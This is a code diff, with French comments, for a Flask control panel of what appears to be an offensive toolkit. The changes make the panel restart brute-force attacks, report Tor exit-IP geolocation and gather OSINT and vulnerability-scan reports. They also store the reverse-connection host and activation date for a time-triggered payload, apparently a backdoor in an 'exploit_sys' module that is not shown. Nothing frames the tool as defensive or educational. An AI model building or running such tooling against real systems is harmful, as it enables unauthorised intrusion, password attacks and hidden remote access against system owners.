@@ -250,9 +250,25 @@ def _run_bruteforce_in_thread(attack_type, options):
 def start_bruteforce_web():
     global bruteforce_thread
     app.logger.debug(f"start_bruteforce_web called. bruteforce_thread: {bruteforce_thread}, is_alive: {bruteforce_thread.is_alive() if bruteforce_thread else 'N/A'}")
+    # Check if a brute-force attack is already running
     if bruteforce_thread and bruteforce_thread.is_alive():
-        app.logger.debug("Brute-force already running (from bruteforce_thread check).")
-        return jsonify({'error': 'Une attaque par force brute est déjà en cours.'}), 409
+        app.logger.warning("Une attaque par force brute est déjà en cours. Arrêt de l'attaque précédente pour démarrer la nouvelle.")
+        try:
+            bruteforce.stop_bruteforce()
+            # Wait for the previous thread to actually stop
+            wait_timeout = 10 # seconds
+            start_time = time.time()
+            # Poll bruteforce_state["running"] flag as it's updated by the worker
+            while bruteforce.bruteforce_state["running"] and (time.time() - start_time < wait_timeout):
+                time.sleep(0.1) # Wait a bit for the thread to stop
+            if bruteforce.bruteforce_state["running"]:
+                app.logger.error("L'attaque précédente n'a pas pu être arrêtée à temps dans les délais impartis. Tentative de démarrage d'une nouvelle attaque malgré tout.")
+            else:
+                app.logger.info("L'attaque précédente a été arrêtée avec succès.")
+            bruteforce_thread = None # Reset the thread reference
+        except Exception as e:
+            app.logger.error(f"Erreur lors de l'arrêt de l'attaque précédente: {e}", exc_info=True)
+            return jsonify({'error': f"Erreur lors de l'arrêt de l'attaque précédente : {e}"}), 500
 
     data = request.get_json()
     attack_type = data.get('attack_type')
@@ -320,13 +336,19 @@ def get_tor_status():
             pass # L'erreur est déjà loggée dans get_requests_session
 
     tor_ip = None
+    tor_ip_country = None
+    tor_ip_city = None
+    tor_ip_country_code = None
     try:
         with open('status.json', 'r') as f:
             status_data = json.load(f)
             tor_ip = status_data.get('tor_ip')
+            tor_ip_country = status_data.get('tor_ip_country')
+            tor_ip_city = status_data.get('tor_ip_city')
+            tor_ip_country_code = status_data.get('tor_ip_country_code')
     except (FileNotFoundError, json.JSONDecodeError):
         pass
-    return jsonify({'tor_enabled': use_tor, 'tor_ip': tor_ip})
+    return jsonify({'tor_enabled': use_tor, 'tor_ip': tor_ip, 'tor_ip_country': tor_ip_country, 'tor_ip_city': tor_ip_city, 'tor_ip_country_code': tor_ip_country_code})
 
 @app.route('/toggle_tor', methods=['POST'])
 def toggle_tor():
@@ -431,12 +453,30 @@ def bot_status():
 
 @app.route('/api/reports', methods=['GET'])
 def list_reports():
-    """Liste les fichiers de rapport dans le dossier outputs."""
+    """Liste les fichiers de rapport dans le dossier outputs, y compris les sous-dossiers."""
     try:
-        # On ne liste que les fichiers qui commencent par "rapport_"
-        files = [f for f in os.listdir(OUTPUTS_DIR) if f.startswith('rapport_')]
-        files.sort(reverse=True) # Afficher les plus récents en premier
-        return jsonify(files)
+        all_reports = []
+        report_patterns = ('rapport_', 'osint.txt', 'scan_results.txt', 'web_vulns.txt')
+        
+        for root, dirs, files in os.walk(OUTPUTS_DIR):
+            for file in files:
+                # Check if the file matches any of the report patterns
+                is_report_file = False
+                for pattern in report_patterns:
+                    if pattern.endswith('.txt') or pattern.endswith('.html') or pattern.endswith('.pdf'):
+                        if file == pattern: # Exact match for specific files
+                            is_report_file = True
+                            break
+                    elif file.startswith(pattern): # Starts with match for general reports
+                        is_report_file = True
+                        break
+                        
+                if is_report_file:
+                    relative_path = os.path.relpath(os.path.join(root, file), OUTPUTS_DIR)
+                    all_reports.append(relative_path)
+        
+        all_reports.sort(reverse=True) # Afficher les plus récents en premier
+        return jsonify(all_reports)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
@@ -507,42 +547,33 @@ def stop_sniffer():
 
 # --- ROUTES POUR LA CONFIGURATION DU PAYLOAD ---
 
-PAYLOAD_FILE = os.path.join(os.path.dirname(__file__), 'modules', 'exploit_sys.py')
+PAYLOAD_CONFIG_FILE = os.path.join(os.path.dirname(__file__), 'modules', 'payload_config.json')
 
 @app.route('/config/payload', methods=['GET'])
 def get_payload_config():
-    """Lit la configuration actuelle du payload (IP et date)."""
+    """Lit la configuration actuelle du payload depuis le fichier JSON."""
     try:
-        with open(PAYLOAD_FILE, 'r', encoding='utf-8') as f:
-            content = f.read()
+        with open(PAYLOAD_CONFIG_FILE, 'r', encoding='utf-8') as f:
+            config_data = json.load(f)
         
-        host_match = re.search(r"REVERSE_HOST\s*=\s*'([^']+)'", content)
-        date_match = re.search(r"ACTIVATION_DATE\s*=\s*datetime\.date\((\d+),\s*(\d+),\s*(\d+)\)", content)
-
-        if not host_match or not date_match:
-            # Fournir une configuration par défaut si le parsing échoue
-            return jsonify({
-                'host': '127.0.0.1',
-                'year': datetime.date.today().year,
-                'month': datetime.date.today().month,
-                'day': datetime.date.today().day,
-                'error': 'Parsing failed, showing default values.'
-            })
+        # Convertir la date YYYY-MM-DD en composants séparés pour le template
+        year, month, day = map(int, config_data.get('ACTIVATION_DATE_STR', '1970-01-01').split('-'))
 
         config = {
-            'host': host_match.group(1),
-            'year': int(date_match.group(1)),
-            'month': int(date_match.group(2)),
-            'day': int(date_match.group(3)),
+            'host': config_data.get('REVERSE_HOST', '127.0.0.1'),
+            'year': year,
+            'month': month,
+            'day': day,
         }
         return jsonify(config)
 
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
+    except (FileNotFoundError, json.JSONDecodeError) as e:
+        return jsonify({'error': f"Erreur de lecture du fichier de configuration du payload: {e}"}), 500
+
 
 @app.route('/config/payload', methods=['POST'])
 def set_payload_config():
-    """Met à jour la configuration du payload."""
+    """Met à jour la configuration du payload dans le fichier JSON."""
     data = request.get_json()
     new_host = data.get('host')
     new_date_str = data.get('date') # Format YYYY-MM-DD
@@ -551,22 +582,15 @@ def set_payload_config():
         return jsonify({'error': 'Les données fournies sont incomplètes.'}), 400
 
     try:
-        year, month, day = map(int, new_date_str.split('-'))
+        # Créer le dictionnaire de configuration
+        new_config = {
+            "REVERSE_HOST": new_host,
+            "ACTIVATION_DATE_STR": new_date_str
+        }
         
-        with open(PAYLOAD_FILE, 'r', encoding='utf-8') as f:
-            lines = f.readlines()
-
-        new_lines = []
-        for line in lines:
-            if line.strip().startswith('REVERSE_HOST'):
-                new_lines.append(f"REVERSE_HOST = '{new_host}'\n")
-            elif line.strip().startswith('ACTIVATION_DATE'):
-                new_lines.append(f"ACTIVATION_DATE = datetime.date({year}, {month}, {day})\n")
-            else:
-                new_lines.append(line)
-
-        with open(PAYLOAD_FILE, 'w', encoding='utf-8') as f:
-            f.writelines(new_lines)
+        # Écrire la nouvelle configuration dans le fichier JSON
+        with open(PAYLOAD_CONFIG_FILE, 'w', encoding='utf-8') as f:
+            json.dump(new_config, f, indent=2)
             
         return jsonify({'message': 'Configuration du payload mise à jour avec succès.'})
 
@@ -610,7 +634,9 @@ def stegano_hide():
     else:
         if os.path.exists(output_path):
             os.remove(output_path)
-        return result, 500
+        # Assuming result string often contains "Erreur :", we can try to infer status code
+        status_code = 400 if "Erreur :" in result else 500
+        return jsonify({'status': 'error', 'message': result}), status_code
 
 @app.route('/stegano/reveal', methods=['POST'])
 def stegano_reveal():
